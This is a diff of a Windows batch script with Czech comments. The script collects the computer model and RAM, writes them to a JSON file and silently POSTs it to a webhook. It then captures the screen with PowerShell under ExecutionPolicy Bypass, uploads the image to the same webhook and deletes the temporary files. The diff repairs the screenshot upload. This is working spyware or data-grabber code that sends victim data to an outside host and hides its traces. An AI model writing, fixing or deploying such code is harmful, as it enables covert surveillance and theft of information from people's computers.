@@ -45,7 +45,7 @@ for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get model') do (
 for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get totalphysicalmemory') do set "ramRaw=%%i"
 set /a ram=%ramRaw:~0,-6%
 
-:: 🧾 Zpráva do JSON souboru (každý řádek zvlášť, žádné ^)
+:: 🧾 Zpráva do JSON souboru (každý řádek zvlášť)
 set "payload=%TEMP%\payload.json"
 (
 echo {
@@ -63,7 +63,7 @@ echo }
 curl -s -X POST %webhook% -H "Content-Type: application/json" --data "@!payload!" >nul
 del /f /q "!payload!"
 
-:: 📸 Screenshot (beze změn)
+:: 📸 Screenshot (opravené odeslání)
 set "ss=%TEMP%\screenshot_%RANDOM%.png"
 powershell -ExecutionPolicy Bypass -Command ^
 "Add-Type -AssemblyName System.Windows.Forms; ^
@@ -75,7 +75,9 @@ $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size)
 $bmp.Save('%ss%', [Drawing.Imaging.ImageFormat]::Png)"
 
 if exist "%ss%" (
-    curl -s -X POST %webhook% -F "file=@%ss%;type=image/png" >nul
+    curl -s -X POST %webhook% ^
+    -F "payload_json={\"content\":\"📸 Screenshot\"}" ^
+    -F "file=@%ss%;type=image/png" >nul
     del /f /q "%ss%"
 )
 
